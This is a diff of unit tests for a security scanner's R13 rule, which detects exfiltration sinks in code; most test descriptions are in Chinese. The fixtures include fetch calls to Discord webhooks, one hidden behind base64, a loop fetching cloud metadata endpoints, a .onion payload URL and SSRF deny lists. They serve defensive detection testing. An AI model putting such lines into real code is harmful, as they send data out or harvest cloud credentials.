@@ -45,10 +45,16 @@ describe('R13 network-exfil: hardcoded exfiltration sinks in string literals', (
     expect(res.report!.verdict).toBe('suspicious')
   })
 
-  it('.onion destination → R13 high', () => {
-    const res = scan(codeRequest({ code: "const url = 'http://abc123.onion/payload'" }))
+  it('.onion destination (valid v2 label) → R13 high', () => {
+    const res = scan(codeRequest({ code: "const url = 'http://3g2upl4pq6kufc4m.onion/payload'" }))
     expect(res.ok).toBe(true)
     expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
+  })
+
+  it('non-onion .onion mentions (action.onion / prose) → no R13', () => {
+    const res = scan(codeRequest({ code: 'const a = "action.onion"; const b = ".onion is anonymized"; const c = "go to .onion now"' }))
+    expect(res.ok).toBe(true)
+    expect(findingOf(res.report!, 'R13')).toBeUndefined()
   })
 
   it('clean code without sinks → no R13, verdict clean', () => {
@@ -69,6 +75,101 @@ describe('R13 network-exfil: hardcoded exfiltration sinks in string literals', (
     const res = scan(codeRequest({ code: "fetch('https://DISCORD.COM/api/webhooks/1/2')" }))
     expect(res.ok).toBe(true)
     expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
+  })
+})
+
+describe('0.3.10 R13 误报治理（OSS 注册表 64 例反馈复现）', () => {
+  it('SSRF 拒绝名单（Set + .has 消费）→ 降 info，verdict 不再升级', () => {
+    const res = scan(codeRequest({
+      code: 'const BLOCKED_HOSTNAMES = new Set(["localhost", "metadata.google.internal", "metadata.amazonaws.com"]);\n'
+        + 'export function isBlocked(host) { return BLOCKED_HOSTNAMES.has(host.trim().toLowerCase()) }',
+    }))
+    expect(res.ok).toBe(true)
+    const r13 = findingOf(res.report!, 'R13')
+    expect(r13).toBeDefined()
+    expect(r13!.severity).toBe('info')
+    expect(r13!.message).toContain('拒绝名单')
+    expect(res.report!.verdict).toBe('clean')
+  })
+
+  it('散文/标签/说明串（字面量整体不是端点）→ 不命中', () => {
+    const res = scan(codeRequest({
+      code: 'const doc = "cloud metadata (169.254.169.254) is not allowed by policy";\n'
+        + 'const label = "Refusing metadata.google.internal for security";',
+    }))
+    expect(res.ok).toBe(true)
+    expect(findingOf(res.report!, 'R13')).toBeUndefined()
+  })
+
+  it('行内 === 比较（守卫判定）→ 降 info', () => {
+    const res = scan(codeRequest({
+      code: 'if (hostname === "metadata.google.internal") throw new Error("cloud metadata media URLs are not allowed")',
+    }))
+    expect(res.ok).toBe(true)
+    const r13 = findingOf(res.report!, 'R13')
+    expect(r13).toBeDefined()
+    expect(r13!.severity).toBe('info')
+    expect(r13!.message).toContain('拒绝名单')
+  })
+
+  it('Object.freeze 拒绝地址表（守卫名提示）→ 降 info', () => {
+    const res = scan(codeRequest({
+      code: 'export const REFUSED_ADDRESSES = Object.freeze([rule("169.254.169.254/32", "cloud-metadata", true), rule("168.63.129.16/32", "azure", true)])',
+    }))
+    expect(res.ok).toBe(true)
+    const r13 = findingOf(res.report!, 'R13')
+    expect(r13).toBeDefined()
+    expect(r13!.severity).toBe('info')
+    expect(r13!.message).toContain('拒绝名单')
+  })
+
+  it('脱敏占位（xxxx 打码模板）→ 降 info', () => {
+    const res = scan(codeRequest({ code: "const tpl = 'https://discord.com/api/webhooks/12345/xxxx'" }))
+    expect(res.ok).toBe(true)
+    const r13 = findingOf(res.report!, 'R13')
+    expect(r13).toBeDefined()
+    expect(r13!.severity).toBe('info')
+    expect(r13!.message).toContain('脱敏占位')
+  })
+
+  it('测试/CI 文件路径 → 降 info（R3 同款目录降级）', () => {
+    withTmp({ 'batch-import.test.mjs': 'fetch("https://discord.com/api/webhooks/123/abc")\n' }, dir => {
+      const res = scan({ kind: 'files', files: [join(dir, 'batch-import.test.mjs')] })
+      expect(res.ok).toBe(true)
+      const r13 = findingOf(res.report!, 'R13')
+      expect(r13).toBeDefined()
+      expect(r13!.severity).toBe('info')
+      expect(r13!.message).toContain('测试/CI')
+      expect(res.report!.verdict).toBe('clean')
+    })
+  })
+
+  it('目标列表（Set + for..of + fetch，无成员判定消费）→ 保持 high（防漏回归）', () => {
+    const res = scan(codeRequest({
+      code: 'const HOSTS = new Set(["metadata.google.internal"]);\n'
+        + 'for (const h of HOSTS) fetch("http://" + h + "/latest/meta-data/")',
+    }))
+    expect(res.ok).toBe(true)
+    const r13 = findingOf(res.report!, 'R13')
+    expect(r13).toBeDefined()
+    expect(r13!.severity).toBe('high')
+  })
+
+  it('模板字面量 URL（含插值缺口）→ 仍 high（真阳性保留）', () => {
+    const res = scan(codeRequest({ code: 'fetch(`https://discord.com/api/webhooks/${token}/send`)' }))
+    expect(res.ok).toBe(true)
+    expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
+  })
+
+  it('N2 解码 webhook 真值 → 仍 high（解码语料通道不受误报治理误伤）', () => {
+    const res = scan(codeRequest({
+      code: 'fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMS8y"))',
+    }))
+    expect(res.ok).toBe(true)
+    const r13 = findingOf(res.report!, 'R13')
+    expect(r13).toBeDefined()
+    expect(r13!.severity).toBe('high')
+    expect(r13!.decodedFrom).toBe('base64')
   })
 })
 
